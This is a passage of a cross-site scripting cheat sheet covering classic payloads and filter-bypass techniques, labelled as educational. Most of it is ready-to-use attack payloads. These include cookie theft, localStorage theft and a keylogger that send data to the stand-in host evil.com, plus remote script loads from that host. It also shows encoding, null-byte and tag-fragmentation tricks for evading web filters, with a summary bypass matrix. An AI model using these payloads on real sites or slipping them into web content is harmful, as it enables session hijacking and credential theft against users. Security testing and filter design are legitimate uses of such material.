
## 3. Payload Types

---

### 3.1 Classic Payloads

---

#### `<script>` Tag

The most direct form of XSS injection — inserting a `<script>` block directly into the page.

```
┌──────────────────────────────────────────────────────────────────┐
│                   HOW <script> INJECTION WORKS                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Attacker input:   <script>alert(1)</script>                     │
│                              │                                   │
│                   Server reflects / stores it                    │
│                              │                                   │
│                              ▼                                   │
│  Page HTML:        <p>Hello, <script>alert(1)</script></p>       │
│                              │                                   │
│                   Browser HTML parser hits <script>              │
│                              │                                   │
│                              ▼                                   │
│                   JavaScript engine executes payload             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

**Proof of Concept:**
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>console.log('XSS')</script>
```

**Cookie Theft:**
```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
<script>new Image().src='https://evil.com/?c='+document.cookie</script>
<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>
```

**Session / Credential Harvesting:**
```html
<!-- Silently exfiltrate via XHR -->
<script>
var x=new XMLHttpRequest();
x.open('GET','https://evil.com/?s='+document.cookie,true);
x.send();
</script>

<!-- Steal localStorage -->
<script>
fetch('https://evil.com/?ls='+btoa(JSON.stringify(localStorage)));
</script>

<!-- Keylogger -->
<script>
document.onkeypress=function(e){
  fetch('https://evil.com/?k='+e.key);
}
</script>
```

**Remote Script Load:**
```html
<!-- Load full attack script from attacker server -->
<script src="https://evil.com/xss.js"></script>
<script src=//evil.com/xss.js></script>
```

---

#### Event Handler Payloads

Event handlers execute JavaScript **without a `<script>` tag** — useful when script tags are filtered.

```
┌──────────────────────────────────────────────────────────────────┐
│               EVENT HANDLER INJECTION LOGIC                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Normal HTML:   <img src="photo.jpg">                            │
│                                                                  │
│  Injected:      <img src=x onerror=alert(1)>                     │
│                              │                                   │
│                  src="x" → image load FAILS                      │
│                              │                                   │
│                              ▼                                   │
│                  onerror fires → alert(1) executes               │
│                                                                  │
│  No <script> tag needed. No closing tag needed.                  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

**`onerror` — Image / Media Load Failure:**
```html
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
```

**`onload` — Fires When Element Loads:**
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<img src=valid.jpg onload=alert(1)>
<iframe src=/ onload=alert(document.cookie)>
```

**`onclick` / `onmouseover` / `onfocus` — User Interaction:**
```html
<a href=# onclick=alert(1)>Click me</a>
<div onclick=alert(1)>Click me</div>
<input onmouseover=alert(1)>
<input autofocus onfocus=alert(document.cookie)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
```

**`onsubmit` / `onchange` / `oninput` — Form Events:**
```html
<form onsubmit=alert(1)><input type=submit></form>
<input type=text onchange=alert(1)>
<input type=text oninput=alert(1)>
```

**`javascript:` URI — Href / Action:**
```html
<a href="javascript:alert(document.cookie)">Click</a>
<form action="javascript:alert(1)"><input type=submit></form>
<iframe src="javascript:alert(1)">
```

**SVG / Math / HTML5 Vectors:**
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>XSS</marquee>
```

**Full Event Handler Reference:**
```
┌─────────────────┬──────────────────────────────────────────────┐
│  EVENT          │  TRIGGER                                     │
├─────────────────┼──────────────────────────────────────────────┤
│ onerror         │ Resource fails to load (img, video, audio)   │
│ onload          │ Element finishes loading                     │
│ onclick         │ User clicks element                         │
│ onmouseover     │ Mouse hovers over element                   │
│ onfocus         │ Element receives focus                      │
│ onblur          │ Element loses focus                         │
│ onsubmit        │ Form is submitted                           │
│ onchange        │ Input value changes                         │
│ oninput         │ User types in input field                   │
│ ontoggle        │ <details> element opened/closed             │
│ onstart         │ <marquee> starts scrolling                  │
│ onanimationend  │ CSS animation completes                     │
│ onpointerover   │ Pointer (mouse/touch) moves over element    │
└─────────────────┴──────────────────────────────────────────────┘
```

---
---

### 3.2 Filter Bypass

Filters and WAFs attempt to block XSS payloads. These techniques evade them.

```
┌──────────────────────────────────────────────────────────────────┐
│                    FILTER BYPASS MINDSET                         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│   Raw payload → [WAF / Filter] → BLOCKED ✗                      │
│                                                                  │
│   Obfuscated  → [WAF / Filter] → PASSES ✓ → Browser decodes     │
│   payload                                   and EXECUTES        │
│                                                                  │
│  The browser is more lenient than the filter.                    │
│  Exploit that gap.                                               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

#### Case Variation

Filters that match exact lowercase strings fail against mixed-case tags.

```html
<!-- Blocked by naive filter: <script> -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Script SrC=//evil.com/xss.js></Script>

<!-- Event handler case variation -->
<img src=x OnErRoR=alert(1)>
<img src=x ONERROR=alert(1)>
<SVG ONLOAD=alert(1)>
```

```
Filter sees:   <script>   → BLOCK
Browser sees:  <ScRiPt>   → EXECUTES  (HTML is case-insensitive)
```

---

#### HTML Encoding

HTML entities are decoded by the browser **before** script execution.

```
Character   HTML Entity     Hex Entity
─────────────────────────────────────
<           &lt;            &#60;
>           &gt;            &#62;
"           &quot;          &#34;
'           &apos;          &#39;
/           &#47;
```

**Entity-encoded payloads:**
```html
<!-- Decimal encoding -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Hex encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Mixed encoding -->
&#60;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&#62;

<!-- Attribute context — browser decodes entity, then executes JS -->
<a href="javascript&#58;alert(1)">click</a>
<a href="javascript&#x3A;alert(1)">click</a>

<!-- Full alert() function encoded -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

---

#### URL Encoding / Double Encoding

Useful when payload passes through a URL parameter or a decoder that runs before the filter.

```
Character   URL Encoded   Double Encoded
─────────────────────────────────────────
<           %3C           %253C
>           %3E           %253E
"           %22           %2522
'           %27           %2527
/           %2F           %252F
(           %28           %2528
)           %29           %2529
```

**URL encoded payloads:**
```
https://site.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E

Decoded by server → <script>alert(1)</script> → reflected into page
```

**Double URL encoded (server decodes once, browser decodes twice):**
```
https://site.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E

Round 1 decode: %253C → %3C
Round 2 decode: %3C   → <
Final result:   <script>alert(1)</script>
```

**Unicode encoding:**
```html
<a href="javascript\u003aalert(1)">click</a>
<a href="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)">click</a>
```

---

#### Null Bytes

Null bytes (`%00`) can break pattern-matching filters mid-token.

```html
<!-- Null byte inserted inside tag name -->
<scr%00ipt>alert(1)</scr%00ipt>
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Null byte before event handler -->
<img src=x %00onerror=alert(1)>

<!-- Null byte inside attribute value -->
<a href="java%00script:alert(1)">click</a>
<a href="java&#0;script:alert(1)">click</a>
<a href="java\0script:alert(1)">click</a>
```

```
Filter regex:   /javascript:/i   → expects continuous string
Null byte:      java\0script:    → regex fails to match
Browser:        strips null byte → executes javascript:
```

> ⚠️ Effectiveness depends on server language and browser version. Works well against older PHP/ASP applications.

---

#### Tag Fragmentation

Splitting or malforming tags so the filter never sees a complete blacklisted pattern, but the browser reconstructs and executes it.

**Nested tag breaking:**
```html
<!-- Filter blocks <script> — so break it with another tag in the middle -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Filter strips <script> once — leaving a second one behind -->
<scr<script>ipt>alert(1)</script>

<!-- Double-nested -->
<<script>script>alert(1)<</script>/script>
```

**Unclosed / malformed tags (browser auto-corrects):**
```html
<script
>alert(1)</script>

<script/type=text/javascript>alert(1)</script>

<script>alert(1)//
```

**Comment injection to break filters:**
```html
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>
<img src=x o<!---->nerror=alert(1)>
```

**Whitespace and special character insertion:**
```html
<!-- Tabs, newlines, carriage returns between attributes -->
<img src=x	onerror=alert(1)>          (tab)
<img src=x
onerror=alert(1)>                         (newline)
<img src=x&#9;onerror=alert(1)>           (HTML tab entity)
<img src=x&#10;onerror=alert(1)>          (HTML newline entity)

<!-- Extra spaces / slashes inside tag -->
<img/src=x/onerror=alert(1)>
< img src=x onerror=alert(1)>
```

**Extraneous characters browsers tolerate:**
```html
<!-- Backtick instead of quote in attribute -->
<img src=`x` onerror=alert(1)>

<!-- No quotes at all -->
<img src=x onerror=alert(1)>

<!-- Extra = sign -->
<img src==x onerror=alert(1)>
```

---

### 🧪 Bypass Cheat Matrix

```
┌────────────────────────┬─────────────────────────────────────────────┐
│  TECHNIQUE             │  EXAMPLE                                    │
├────────────────────────┼─────────────────────────────────────────────┤
│ Case variation         │ <ScRiPt>alert(1)</ScRiPt>                   │
│ HTML entity (decimal)  │ &#60;script&#62;alert(1)&#60;/script&#62;   │
│ HTML entity (hex)      │ &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;│
│ URL encode             │ %3Cscript%3Ealert(1)%3C%2Fscript%3E         │
│ Double URL encode      │ %253Cscript%253Ealert(1)                    │
│ Null byte              │ <scr%00ipt>alert(1)</scr%00ipt>             │
│ Tag fragmentation      │ <scr<script>ipt>alert(1)</script>           │
│ Comment injection      │ <scr<!--x-->ipt>alert(1)</script>           │
│ Whitespace (tab)       │ <img src=x	onerror=alert(1)>              │
│ Backtick attribute     │ <img src=`x` onerror=alert(1)>              │
│ No closing tag         │ <svg onload=alert(1)>                       │
│ javascript: encoding   │ <a href="javascript&#58;alert(1)">          │
│ Unicode escape         │ \u003cscript\u003ealert(1)\u003c/script\u003e│
└────────────────────────┴─────────────────────────────────────────────┘
```

---

*XSS Cheat Sheet · Section 3.1–3.2 — Classic Payloads & Filter Bypass*
*For educational purposes only*
